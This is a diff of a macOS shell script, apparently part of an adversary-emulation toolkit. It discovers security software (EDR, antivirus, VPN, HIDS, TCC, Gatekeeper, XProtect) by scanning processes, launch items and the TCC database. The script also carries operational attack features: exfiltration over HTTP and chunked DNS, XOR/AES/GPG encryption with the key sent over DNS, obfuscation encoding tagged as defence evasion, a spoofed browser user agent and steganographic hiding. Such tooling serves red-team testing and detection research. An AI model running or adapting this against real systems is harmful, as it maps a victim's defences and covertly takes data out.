@@ -1,26 +1,26 @@
 #!/bin/sh
-# POSIX-compliant shell script - avoid bashisms
-# Script Name: security_software.sh
-# MITRE ATT&CK Technique: security
+# POSIX-compliant
+# Procedure Name: security_software
+# Tactic: Discovery
+# Technique: T1518
+# GUID: 97dcec8b-dd04-4fea-9778-1e6d281ce539
+# Intent: Comprehensive security software discovery for macOS systems including EDR, AV, firewalls, and built-in protections
 # Author: @darmado | https://x.com/darmad0
-# Date: 2025-01-27
+# created: 2025-01-27
+# Updated: 2025-05-30
 # Version: 2.0.0
+# License: Apache 2.0
 
-# Description:
-# Comprehensive security software discovery for macOS systems including EDR, AV, firewalls, and built-in protections
-# MITRE ATT&CK Tactic: Discovery
-# Procedure GUID: 456e7890-e12b-34c5-d678-901234567890
-# Generated from YAML procedure definition using build_procedure.py
-# The script uses native macOS commands and APIs for maximum compatibility.
+# Core function Info:
+# This is a standalone base script template that can be used to build any technique.
 
 #------------------------------------------------------------------------------
 # Configuration Section
 #------------------------------------------------------------------------------
-
+NAME="" 
 # MITRE ATT&CK Mappings
 TACTIC="Discovery" #replace with you coresponding tactic
-TTP_ID="T1082" #replace with you coresponding ttp_id
-SUBTECHNIQUE_ID=""
+TTP_ID="T1518" #replace with you coresponding ttp_id
 
 TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
 TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
@@ -38,7 +38,7 @@ TTP_ID_ENCRYPT_XOR="T1027.007" # DO NOT MODIFY
 JOB_ID=""  # Will be set after core functions are defined
 
 # Script Information
-NAME="security_software"
+
 SCRIPT_CMD="$0 $*"
 SCRIPT_STATUS="running"
 OWNER="$USER"
@@ -92,27 +92,6 @@ CMD_WC="wc"
 CMD_CAT="cat"
 CMD_LSOF="lsof"
 
-# Logging Settings
-HOME_DIR="${HOME}"
-LOG_DIR="./logs"  # Simple path to logs in current directory
-LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
-LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
-LOG_ENABLED=false
-SYSLOG_TAG="${NAME}"
-
-# Default settings
-DEBUG=false
-ALL=false
-SHOW_HELP=false
-STEG_TRANSFORM=false # Enable steganography transformation
-STEG_EXTRACT=false # Extract hidden data from steganography
-STEG_EXTRACT_FILE="" # File to extract hidden data from
-
-# OPSEC Check Settings (enabled by build script based on YAML configuration)
-CHECK_PERMS="true"
-CHECK_FDA="true"
-CHECK_DB_LOCK="false"
-
 EDR=false
 EDR_PS=false
 EDR_INFO=false
@@ -139,19 +118,33 @@ HIDS_PATTERN="(hids|ossec|samhain|aide|tripwire|rkhunter|chkrootkit|tiger|lynis)
 TCC_SYSTEM_DB="/Library/Application Support/com.apple.TCC/TCC.db"
 TCC_USER_DB="$HOME/Library/Application Support/com.apple.TCC/TCC.db"
 
-# MITRE ATT&CK Mappings
-TACTIC="Discovery" #replace with your corresponding tactic
-TTP_ID="T1082" #replace with your corresponding ttp_id
-SUBTECHNIQUE_ID=""
+# Procedure Information (set by build system)
+PROCEDURE_NAME="security_software"  # Set by build system from YAML procedure_name field
 
-TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
-TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
-TACTIC_ENCODE="Defense Evasion" # DO NOT MODIFY
-TTP_ID_ENCODE="T1140" # DO NOT MODIFY
-TTP_ID_ENCODE_BASE64="T1027.001" # DO NOT MODIFY
-TTP_ID_ENCODE_HEX="T1027" # DO NOT MODIFY
-TTP_ID_ENCODE_PERL="T1059.006" # DO NOT MODIFY
-TTP_ID_ENCODE_PERL_UTF8="T1027.010" # DO NOT MODIFY
+# Function execution tracking
+FUNCTION_LANG=""  # Ued by log_output at execution time
+
+# Logging Settings
+HOME_DIR="${HOME}"
+LOG_DIR="./logs"  # Simple path to logs in current directory
+LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
+LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
+LOG_ENABLED=false
+SYSLOG_TAG="${TTP_ID}_${PROCEDURE_NAME}"
+
+# Default settings
+DEBUG=false
+ALL=false
+SHOW_HELP=false
+STEG_TRANSFORM=false # Enable steganography transformation
+STEG_EXTRACT=false # Extract hidden data from steganography
+STEG_EXTRACT_FILE="" # File to extract hidden data from
+
+# OPSEC Check Settings (enabled by build script based on YAML configuration)
+CHECK_PERMS="false"
+CHECK_FDA="true"
+CHECK_DB_LOCK="false"
+
 
 # Output Configuration
 FORMAT=""          # json, csv, or empty for raw
@@ -187,7 +180,7 @@ DEFAULT_STEG_CARRIER="/System/Library/Desktop Pictures/Monterey Graphic.heic"
 # Purpose: Get the current timestamp in a consistent format
 # Inputs: None
 # Outputs: Timestamp string in "YYYY-MM-DD HH:MM:SS" format
-# Side Effects: None
+# - None
 core_get_timestamp() {
     # Use direct command to avoid variable expansion issues
     date "+%Y-%m-%d %H:%M:%S"
@@ -196,7 +189,7 @@ core_get_timestamp() {
 # Purpose: Generate a unique job ID for tracking script execution
 # Inputs: None
 # Outputs: 8-character hexadecimal job ID
-# Side Effects: None
+# - None
 core_generate_job_id() {
     # Use openssl to generate random hex string for job tracking
     # Fallback to date-based ID if openssl not available
@@ -214,7 +207,7 @@ core_generate_job_id() {
 # Purpose: Print debug messages to stderr when debug mode is enabled
 # Inputs: $1 - Message to print
 # Outputs: None (prints directly to stderr)
-# Side Effects: Writes to stderr if DEBUG=true
+# - Writes to stderr if DEBUG=true
 core_debug_print() {
     if [ "$DEBUG" = true ]; then
         local timestamp=$(core_get_timestamp)
@@ -225,12 +218,12 @@ core_debug_print() {
 # Purpose: Print verbose messages to stdout when verbose mode is enabled
 # Inputs: $1 - Message to print
 # Outputs: None (prints directly to stdout)
-# Side Effects: Writes to stdout if VERBOSE=true
+# - Writes to stdout if VERBOSE=true
 
 # Purpose: Handle errors consistently with proper formatting and logging
 # Inputs: $1 - Error message
 # Outputs: None (prints directly to stderr)
-# Side Effects: 
+# - 
 #   - Writes to stderr
 #   - Logs error message if LOG_ENABLED=true
 #   - Returns error code 1
@@ -252,7 +245,7 @@ core_handle_error() {
 #   $2 - Status type (info, error, etc.), defaults to "info"
 #   $3 - Skip data flag (true/false), defaults to false
 # Outputs: None
-# Side Effects:
+# 
 #   - Creates log directory if it doesn't exist
 #   - Writes to log file if LOG_ENABLED=true
 #   - Rotates log file if size exceeds LOG_MAX_SIZE
@@ -265,7 +258,7 @@ core_log_output() {
     
     if [ "$LOG_ENABLED" = true ]; then
         # Ensure log directory exists
-        if [ ! -d "$LOG_DIR" ]; then
+            if [ ! -d "$LOG_DIR"  ] || [ ! -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
             $CMD_MKDIR -p "$LOG_DIR" 2>/dev/null || {
                 $CMD_PRINTF "Warning: Failed to create log directory.\n" >&2
                 return 1
@@ -279,7 +272,7 @@ core_log_output() {
         fi
         
         # Log detailed entry
-        "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s status=%s\\n" \
+        "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s language=%s status=%s\\n" \
             "$(core_get_timestamp)" \
             "$status" \
             "$$" \
@@ -291,7 +284,9 @@ core_log_output() {
             "${FORMAT:-raw}" \
             "$ENCODING_TYPE" \
             "${ENCRYPTION_TYPE:-none}" \
-            "${EXFIL_TYPE:-none}" >> "$LOG_DIR/$LOG_FILE_NAME"
+            "${EXFIL_TYPE:-none}" \
+            "${FUNCTION_LANG:-shell}" \
+            "$status" >> "$LOG_DIR/$LOG_FILE_NAME"
             
         if [ "$skip_data" = "false" ] && [ -n "$output" ]; then
             "$CMD_PRINTF" "command: %s\\ndata:\\n%s\\n---\\n" \
@@ -303,7 +298,7 @@ core_log_output() {
         fi
 
         # Also log to syslog
-        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} cmd=\"$SCRIPT_CMD\""
+        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} language=${FUNCTION_LANG:-shell} cmd=\"$SCRIPT_CMD\""
     fi
     
     # Output to stdout if in debug mode only
@@ -317,7 +312,7 @@ core_log_output() {
 #  $1 - Input string to validate
 #  $2 - Validation type (string|integer|domain|url|file_path)
 #Outputs: 0 if valid, 1 if invalid
-#Side Effects: Prints error message to stderr on validation failure
+#- Prints error message to stderr on validation failure
 core_validate_input() {
     local input="$1"
     local validation_type="$2"
@@ -392,7 +387,7 @@ core_validate_input() {
 # Purpose: Extract domain from URL for validation
 # Inputs: $1 - URL string
 # Outputs: Domain part of URL
-# Side Effects: None
+# - None
 core_extract_domain_from_url() {
     local url="$1"
     "$CMD_PRINTF"  "$url" | sed -E 's~^https?://([^/:]+).*~\1~'
@@ -401,7 +396,7 @@ core_extract_domain_from_url() {
 # Purpose: Validate that essential commands are available before script execution
 # Inputs: None
 # Outputs: None
-# Side Effects:
+# Logic:
 #   - Returns 1 if any essential command is missing
 #   - Calls core_handle_error on missing commands
 core_validate_command() {
@@ -425,7 +420,7 @@ core_validate_command() {
 # Purpose: Check if a domain resolves to a valid IP address
 # Inputs: $1 - Domain to check
 # Outputs: 0 if domain resolves, 1 if not
-# Side Effects: Prints error message if domain doesn't resolve
+# - Prints error message if domain doesn't resolve
 core_validate_domain() {
     local domain="$1"
     
@@ -462,7 +457,7 @@ core_validate_domain() {
 # Purpose: Parse command-line arguments and set global variables (NO VALIDATION)
 # Inputs: $@ - All command-line arguments passed to the script
 # Outputs: None
-# Side Effects: Sets global flag variables based on command-line options
+# - Sets global flag variables based on command-line options
 core_parse_args() {
     # Track unknown arguments and missing values for error reporting
     UNKNOWN_ARGS=""
@@ -673,21 +668,21 @@ Basic Options:
   -h, --help           Display this help message
   -d, --debug          Enable debug output (includes verbose output)
   -a, --all            Process all available data (technique-specific)
-  --edr                     Discover all EDR solutions (processes, applications, launch items)
-  --edr-ps                  Check for EDR processes using ps with tactical intelligence
-  --edr-info                Get detailed EDR application and launch item information
-  --av                      Discover antivirus products
-  --ost                     Discover Objective-See security tools
-  --mrt-apps                Discover malware removal tools
-  --log-forwarder           Discover log forwarding applications
-  --vpn                     Discover VPN applications
-  --hids                    Discover Host-based Intrusion Detection Systems
-  --tcc                     Check TCC database and permissions
-  --gatekeeper              Check Gatekeeper status and code signing policies
-  --xprotect                Check XProtect malware detection service
-  --mrt                     Check Malware Removal Tool service
-  --firewall                Check macOS Application Firewall configuration
-  --quarantine              Check File Quarantine system status
+  --edr                     Discover all EDR solutions using ps, system_profiler, and find commands
+  --edr-ps                  Check for EDR processes using ps aux with perl pattern matching
+  --edr-info                Get detailed EDR information using system_profiler and find commands
+  --av                      Discover antivirus products using system_profiler and find commands
+  --ost                     Discover Objective-See security tools using system_profiler and find commands
+  --mrt-apps                Discover malware removal tools using system_profiler and find commands
+  --log-forwarder           Discover log forwarding applications using system_profiler and find commands
+  --vpn                     Discover VPN applications using system_profiler and find commands
+  --hids                    Discover Host-based Intrusion Detection Systems using system_profiler and find commands
+  --tcc                     Check TCC database and permissions using sqlite3 and pgrep commands
+  --gatekeeper              Check Gatekeeper status using spctl command
+  --xprotect                Check XProtect malware detection service using pgrep and defaults commands
+  --mrt                     Check Malware Removal Tool service using pgrep and defaults commands
+  --firewall                Check macOS Application Firewall configuration using defaults command
+  --quarantine              Check File Quarantine system status using find and xattr commands
 
 Output Options:
   --format TYPE        Output format: 
@@ -735,7 +730,7 @@ EOF
 #   $1 - Raw output data to process
 #   $2 - Data source identifier (defaults to "generic")
 # Outputs: Processed output (formatted/encoded/encrypted as requested)
-# Side Effects:
+# Logic:
 #   - May set global ENCODING_TYPE and ENCRYPTION_TYPE variables
 core_process_output() {
     local output="$1"
@@ -749,10 +744,10 @@ core_process_output() {
     if [ -n "$FORMAT" ]; then
         if [ "$FORMAT" = "json" ] || [ "$FORMAT" = "JSON" ]; then
             # For JSON, only use raw data here - we'll add transformation metadata at the end
-            processed=$(core_format_output "$output" "$FORMAT" "$data_source" "false" "none" "false" "none" "false")
+            processed=$(core_format_output "$output" "$FORMAT" "$PROCEDURE_NAME" "false" "none" "false" "none" "false")
         else
             # For other formats, just format the raw output
-            processed=$(core_format_output "$output" "$FORMAT" "$data_source")
+            processed=$(core_format_output "$output" "$FORMAT" "$PROCEDURE_NAME")
         fi
         core_debug_print "Output formatted as $FORMAT"
     fi
@@ -799,7 +794,7 @@ core_process_output() {
 #   $3 - Data source identifier (defaults to "generic")
 #   $4-7 - Additional parameters for JSON metadata
 # Outputs: Formatted data
-# Side Effects: None
+# - None
 core_format_output() {
     local output="$1"
     local format="$2"
@@ -815,7 +810,7 @@ core_format_output() {
     
     case "$format" in
         json|json-lines)
-            formatted=$(core_format_as_json "$output" "$data_source" "$is_encoded" "$encoding" "$is_encrypted" "$encryption" "$is_steganography")
+            formatted=$(core_format_as_json "$output" "$PROCEDURE_NAME" "$is_encoded" "$encoding" "$is_encrypted" "$encryption" "$is_steganography")
             ;;
         csv)
             formatted=$(core_format_as_csv "$output")
@@ -838,7 +833,7 @@ core_format_output() {
 #   $6 - Encryption method
 #   $7 - Whether steganography is used (true/false)
 # Outputs: JSON-formatted string with data and metadata
-# Side Effects: None
+# - None
 core_format_as_json() {
     local output="$1"
     local data_source="${2:-generic}"
@@ -859,7 +854,7 @@ core_format_as_json() {
     json_output="$json_output
   \"jobId\": \"$JOB_ID\","
     json_output="$json_output
-  \"dataSource\": \"$data_source\","
+  \"procedure\": \"$PROCEDURE_NAME\","
     
     # Always include encoding and encryption status
         json_output="$json_output
@@ -962,7 +957,7 @@ core_format_as_csv() {
 #   $1 - Output data to encode
 #   $2 - Encoding method (base64/b64, hex, perl_b64, perl_utf8)
 # Outputs: Encoded data according to specified method
-# Side Effects: None
+# - None
 core_encode_output() {
     local output="$1"
     local encode_type="$2"
@@ -1004,7 +999,7 @@ core_encode_output() {
 #   $2 - Encryption method (none|aes|gpg|xor)
 #   $3 - Encryption key (optional, uses ENCRYPT_KEY global if not provided)
 # Outputs: Encrypted data or original data if no encryption
-# Side Effects: None (delegated to specific encryption functions)
+# - None (delegated to specific encryption functions)
 core_encrypt_output() {
     local data="$1"
     local method="$2"
@@ -1052,7 +1047,7 @@ core_encrypt_output() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: AES-256-CBC encrypted data in base64 format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "aes" on success
 #   - Writes error message to stderr on failure
 encrypt_with_aes() {
@@ -1079,7 +1074,7 @@ encrypt_with_aes() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: GPG symmetrically encrypted data in ASCII armor format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "gpg" on success
 #   - Writes error message to stderr on failure/if GPG not found
 encrypt_with_gpg() {
@@ -1106,7 +1101,7 @@ encrypt_with_gpg() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: XOR encrypted data in base64 format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "xor" on success
 #   - When used with exfiltration, the key is sent via DNS TXT record or included in HTTP payload
 encrypt_with_xor() {
@@ -1146,7 +1141,7 @@ encrypt_with_xor() {
 # Purpose: URL-safe encode data for HTTP/HTTPS exfiltration
 # Inputs: $1 - Data to encode
 # Outputs: Base64 URL-safe encoded data
-# Side Effects: None
+# - None
 core_url_safe_encode() {
     local data="$1"
     local encoded
@@ -1163,7 +1158,7 @@ core_url_safe_encode() {
 # Purpose: DNS-safe encode data for DNS exfiltration
 # Inputs: $1 - Data to encode  
 # Outputs: Base64 DNS-safe encoded data
-# Side Effects: None
+# - None
 core_dns_safe_encode() {
     local data="$1"
     local encoded
@@ -1180,7 +1175,7 @@ core_dns_safe_encode() {
 # Purpose: Generate user agent string for HTTP requests
 # Inputs: None
 # Outputs: User agent string
-# Side Effects: None
+# - None
 core_get_user_agent() {
     $CMD_PRINTF "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
 }
@@ -1188,7 +1183,7 @@ core_get_user_agent() {
 # Purpose: Prepare proxy argument for curl if needed
 # Inputs: None - uses global PROXY_URL variable
 # Outputs: Proxy argument for curl or empty string
-# Side Effects: May modify global PROXY_URL to add protocol prefix
+# - May modify global PROXY_URL to add protocol prefix
 core_prepare_proxy_arg() {
     local proxy_arg=""
     
@@ -1205,7 +1200,7 @@ core_prepare_proxy_arg() {
 # Purpose: Normalize URI by ensuring it has http:// prefix
 # Inputs: $1 - URI to normalize
 # Outputs: Normalized URI with protocol prefix
-# Side Effects: None
+# - None
 core_normalize_uri() {
     local uri="$1"
     
@@ -1218,7 +1213,7 @@ core_normalize_uri() {
 # Purpose: Extract domain from a full URI
 # Inputs: $1 - Full URI
 # Outputs: Domain part of the URI
-# Side Effects: None
+# - None
 core_extract_domain() {
     local uri="$1"
     "$CMD_PRINTF" '%s' "$uri" | sed -E 's~^https?://([^/:]+).*~\1~'
@@ -1228,7 +1223,7 @@ core_extract_domain() {
 # Inputs: 
 #   $1 - Raw data
 # Outputs: Data with optional start/end markers
-# Side Effects: None (uses global EXFIL_START/EXFIL_END)
+# - None (uses global EXFIL_START/EXFIL_END)
 core_prepare_exfil_data() {
     local data="$1"
     
@@ -1246,7 +1241,7 @@ core_prepare_exfil_data() {
 # Inputs:
 #   $1 - Domain to send key to
 # Outputs: Encrypted key (base64) if DNS sending failed, empty otherwise
-# Side Effects: Makes DNS request
+# - Makes DNS request
 core_send_key_via_dns() {
     local domain="$1"
     local encrypted_key=""
@@ -1289,7 +1284,7 @@ core_send_key_via_dns() {
 #   $1 - Encoded data
 #   $2 - Optional encrypted key (empty if key sent via DNS)
 # Outputs: JSON payload string
-# Side Effects: None
+# - None
 core_generate_json_payload() {
     local encoded_data="$1"
     local encrypted_key="$2"
@@ -1333,7 +1328,7 @@ EOF
 # Purpose: Determine appropriate content type for HTTP exfiltration
 # Inputs: None (uses global ENCODE variable)
 # Outputs: Content type string
-# Side Effects: None
+# - None
 core_get_content_type() {
     local content_type="text/plain"
     if [ "$ENCODE" = "base64" ] || [ "$ENCODE" = "b64" ]; then
@@ -1348,7 +1343,7 @@ core_get_content_type() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes HTTP request
+# - Makes HTTP request
 core_exfil_http_post() {
     local data="$1"
     local full_uri=$(core_normalize_uri "$EXFIL_URI")
@@ -1394,7 +1389,7 @@ core_exfil_http_post() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes multiple HTTP requests
+# - Makes multiple HTTP requests
 core_exfil_http_get() {
     local data="$1"
     local full_uri=$(core_normalize_uri "$EXFIL_URI")
@@ -1468,7 +1463,7 @@ core_exfil_http_get() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes multiple DNS requests
+# - Makes multiple DNS requests
 core_exfil_dns() {
     local data="$1"
     
@@ -1544,7 +1539,7 @@ core_exfil_dns() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects:
+# Logic:
 #   - Logs exfiltration attempt if LOG_ENABLED=true
 #   - Performs network requests to exfiltrate data
 #   - May modify data for transport (encoding, chunking)
@@ -1598,7 +1593,7 @@ core_exfiltrate_data() {
 # Inputs:
 #   $1 - Processed data (after formatting/encoding/encryption)
 # Outputs: None (writes to various destinations)
-# Side Effects:
+# Logic:
 #   - Logs output if LOG_ENABLED=true
 #   - Exfiltrates data if EXFIL=true
 #   - Always prints data to stdout
@@ -1630,7 +1625,7 @@ core_transform_output() {
 # Purpose: Extract hidden data from a steganography image
 # Inputs: $1 - Image file with hidden data
 # Outputs: Extracted and decoded data
-# Side Effects: None
+# - None
 core_extract_steganography() {
     local steg_file="$1"
     
@@ -1666,7 +1661,7 @@ core_extract_steganography() {
 # Purpose: Perform steganography by hiding data in an image
 # Inputs: None (uses global variables)
 # Outputs: Status message
-# Side Effects: Creates output image file
+# - Creates output image file
 core_steganography() {
     # Define local variables
     local message=""
@@ -1739,7 +1734,7 @@ core_steganography() {
 # Purpose: Apply steganography to data in the processing pipeline
 # Inputs: $1 - Data to hide in steganography
 # Outputs: Status message (actual data is written to file)
-# Side Effects: Creates output image file
+# - Creates output image file
 core_apply_steganography() {
     local data_to_hide="$1"
     local carrier_image=""
@@ -1782,7 +1777,7 @@ core_apply_steganography() {
 #   $3 - Write permission required (true/false)
 #   $4 - Execute permission required (true/false)
 # Outputs: 0 if all required permissions are granted, 1 if any required permission is missing
-# Side Effects: Logs debug information
+# - Logs debug information
 core_check_perms() {
     local file="$1"
     local read_required="$2"
@@ -1811,7 +1806,7 @@ core_check_perms() {
     return 0
 }
 
-# Side Effects: None
+# - None
 # Note: Simple implementation for YAML check_fda
 core_check_fda() {
     [ -f "$TCC_SYSTEM_DB" ] && [ -r "$TCC_SYSTEM_DB" ] && [ -f "$TCC_USER_DB" ] && [ -r "$TCC_USER_DB" ]
@@ -1820,7 +1815,7 @@ core_check_fda() {
 # Purpose: Check if database is locked by another process
 # Inputs: $1 - Database path
 # Outputs: 0 if database is not locked, 1 if locked
-# Side Effects: None
+# - None
 # Note: Comprehensive implementation checking lock files, processes, and database state
 core_check_db_lock() {
     local db_path="$1"
@@ -1911,6 +1906,9 @@ core_main() {
         # Execute script-specific logic here
 # Execute main logic
 raw_output=""
+
+# Set global function language for this procedure
+FUNCTION_LANG="shell"
 
 # Execute functions for --edr
 if [ "$EDR" = true ]; then
@@ -2017,8 +2015,8 @@ if [ "$QUARANTINE" = true ]; then
     raw_output="${raw_output}${result}\n"
 fi
 
-# Set data source
-data_source="security_software"
+# Set procedure name for processing
+procedure="security_software"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -2027,7 +2025,7 @@ data_source="security_software"
         fi  
     fi
     # Process the output (format, encode, encrypt)
-    processed_output=$(core_process_output "$raw_output" "$data_source")
+    processed_output=$(core_process_output "$raw_output" "$PROCEDURE_NAME")
     
     # Handle the final output (log, exfil, or display)
     core_transform_output "$processed_output"
@@ -2037,7 +2035,7 @@ data_source="security_software"
 # Purpose: Validate parsed arguments for correctness and security
 # Inputs: None (uses global variables set by core_parse_args)
 # Outputs: 0 if valid, 1 if invalid
-# Side Effects: Prints error messages for invalid arguments but continues execution
+# - Prints error messages for invalid arguments but continues execution
 core_validate_parsed_args() {
     local validation_errors=""
     local has_valid_actions=false
@@ -2169,7 +2167,7 @@ core_validate_parsed_args() {
 # Purpose: Generate encryption key if encryption is enabled
 # Inputs: None (uses global ENCRYPT variable)
 # Outputs: None
-# Side Effects: Sets global ENCRYPT_KEY variable
+# - Sets global ENCRYPT_KEY variable
 core_generate_encryption_key() {
     if [ "$ENCRYPT" != "none" ]; then
         ENCRYPT_KEY=$("$CMD_PRINTF" '%s' "$JOB_ID$(date +%s%N)$RANDOM" | $CMD_OPENSSL dgst -sha256 | cut -d ' ' -f 2)
@@ -2185,7 +2183,7 @@ core_generate_encryption_key() {
 # Functions from YAML procedure
 
 # Function: discover_edr_all
-# Description: discover_edr_all - Generated from YAML procedure
+# Description: discover_edr_all - Generated from YAML
 discover_edr_all() {
     discover_edr_processes
     raw_output="$raw_output"$'\n'
@@ -2194,9 +2192,9 @@ discover_edr_all() {
 
 
 # Function: discover_edr_processes
-# Description: discover_edr_processes - Generated from YAML procedure
+# Description: discover_edr_processes - Generated from YAML
 discover_edr_processes() {
-    local edr_result=$(ps aux | perl -ne "print if /$EDR_PATTERN/i" | $CMD_HEAD -20)
+    local edr_result=$(ps aux | perl -ne "print if /$EDR_PATTERN/i" | head -20)
     if [ -n "$edr_result" ]; then
         $CMD_PRINTF "EDR_PROCESS|active|%s\n" "$edr_result"
     else
@@ -2206,7 +2204,7 @@ discover_edr_processes() {
 
 
 # Function: discover_edr_info
-# Description: discover_edr_info - Generated from YAML procedure
+# Description: discover_edr_info - Generated from YAML
 discover_edr_info() {
     local edr_apps=$(system_profiler SPApplicationsDataType | perl -00 -ne "print if /$EDR_PATTERN/i")
     if [ -n "$edr_apps" ]; then
@@ -2216,7 +2214,7 @@ discover_edr_info() {
     fi
     
     # Check launch daemons
-    local daemon_result=$(find /Library/LaunchDaemons -name "*.plist" -exec $CMD_GREP -l -i -E "$EDR_PATTERN" {} \; 2>/dev/null)
+    local daemon_result=$(find /Library/LaunchDaemons -name "*.plist" -exec grep -l -i -E "$EDR_PATTERN" {} \; 2>/dev/null)
     if [ -n "$daemon_result" ]; then
         $CMD_PRINTF "EDR_DAEMONS|system|%s\n" "$daemon_result"
     else
@@ -2224,7 +2222,7 @@ discover_edr_info() {
     fi
     
     # Check launch agents
-    local agent_result=$(find /Library/LaunchAgents ~/Library/LaunchAgents -name "*.plist" -exec $CMD_GREP -l -i -E "$EDR_PATTERN" {} \; 2>/dev/null)
+    local agent_result=$(find /Library/LaunchAgents ~/Library/LaunchAgents -name "*.plist" -exec grep -l -i -E "$EDR_PATTERN" {} \; 2>/dev/null)
     if [ -n "$agent_result" ]; then
         $CMD_PRINTF "EDR_AGENTS|user|%s\n" "$agent_result"
     else
@@ -2234,7 +2232,7 @@ discover_edr_info() {
 
 
 # Function: discover_security_apps
-# Description: discover_security_apps - Generated from YAML procedure
+# Description: discover_security_apps - Generated from YAML
 discover_security_apps() {
     local category="$1"
     local pattern="$2"
@@ -2249,7 +2247,7 @@ discover_security_apps() {
     fi
     
     # Check launch daemons
-    local daemon_result=$(find /Library/LaunchDaemons -name "*.plist" -exec $CMD_GREP -l -i -E "$pattern" {} \; 2>/dev/null)
+    local daemon_result=$(find /Library/LaunchDaemons -name "*.plist" -exec grep -l -i -E "$pattern" {} \; 2>/dev/null)
     if [ -n "$daemon_result" ]; then
         output="$output"$'\n'"${category^^}_DAEMONS|system|$daemon_result"
     else
@@ -2257,7 +2255,7 @@ discover_security_apps() {
     fi
     
     # Check launch agents
-    local agent_result=$(find /Library/LaunchAgents ~/Library/LaunchAgents -name "*.plist" -exec $CMD_GREP -l -i -E "$pattern" {} \; 2>/dev/null)
+    local agent_result=$(find /Library/LaunchAgents ~/Library/LaunchAgents -name "*.plist" -exec grep -l -i -E "$pattern" {} \; 2>/dev/null)
     if [ -n "$agent_result" ]; then
         output="$output"$'\n'"${category^^}_AGENTS|user|$agent_result"
     else
@@ -2269,51 +2267,51 @@ discover_security_apps() {
 
 
 # Function: discover_av_all
-# Description: discover_av_all - Generated from YAML procedure
+# Description: discover_av_all - Generated from YAML
 discover_av_all() {
     discover_security_apps "antivirus" "$AV_PATTERN"
 }
 
 
 # Function: discover_ost_apps
-# Description: discover_ost_apps - Generated from YAML procedure
+# Description: discover_ost_apps - Generated from YAML
 discover_ost_apps() {
     discover_security_apps "objective-see" "$OST_PATTERN"
 }
 
 
 # Function: discover_mrt_apps
-# Description: discover_mrt_apps - Generated from YAML procedure
+# Description: discover_mrt_apps - Generated from YAML
 discover_mrt_apps() {
     discover_security_apps "malware-removal" "$MRT_PATTERN"
 }
 
 
 # Function: discover_logforward_apps
-# Description: discover_logforward_apps - Generated from YAML procedure
+# Description: discover_logforward_apps - Generated from YAML
 discover_logforward_apps() {
     discover_security_apps "log-forwarding" "$LOGFORWARD_PATTERN"
 }
 
 
 # Function: discover_vpn_apps
-# Description: discover_vpn_apps - Generated from YAML procedure
+# Description: discover_vpn_apps - Generated from YAML
 discover_vpn_apps() {
     discover_security_apps "vpn" "$VPN_PATTERN"
 }
 
 
 # Function: discover_hids_apps
-# Description: discover_hids_apps - Generated from YAML procedure
+# Description: discover_hids_apps - Generated from YAML
 discover_hids_apps() {
     discover_security_apps "hids" "$HIDS_PATTERN"
 }
 
 
 # Function: discover_tcc_info
-# Description: discover_tcc_info - Generated from YAML procedure
+# Description: discover_tcc_info - Generated from YAML
 discover_tcc_info() {
-    if p$CMD_GREP syspolicyd > /dev/null; then
+    if pgrep syspolicyd > /dev/null; then
         local tcc_status="TCC_SERVICE|syspolicyd|active"
         if [ -f "$TCC_SYSTEM_DB" ] && [ -r "$TCC_SYSTEM_DB" ]; then
             local permissions=$($CMD_SQLITE3 "$TCC_SYSTEM_DB" "SELECT client, service, allowed FROM access LIMIT 5" 2>/dev/null)
@@ -2329,10 +2327,10 @@ discover_tcc_info() {
 
 
 # Function: discover_gatekeeper_info
-# Description: discover_gatekeeper_info - Generated from YAML procedure
+# Description: discover_gatekeeper_info - Generated from YAML
 discover_gatekeeper_info() {
     local gatekeeper_status=$(spctl --status 2>/dev/null)
-    if $CMD_PRINTF "%s\n" "$gatekeeper_status" | $CMD_GREP -q "enabled"; then
+    if echo "$gatekeeper_status" | $CMD_GREP -q "enabled"; then
         local assessment=$(spctl --assess --verbose /Applications/Safari.app 2>/dev/null | $CMD_HEAD -3)
         $CMD_PRINTF "GATEKEEPER|enabled|%s\n" "$assessment"
     else
@@ -2342,11 +2340,11 @@ discover_gatekeeper_info() {
 
 
 # Function: discover_xprotect_info
-# Description: discover_xprotect_info - Generated from YAML procedure
+# Description: discover_xprotect_info - Generated from YAML
 discover_xprotect_info() {
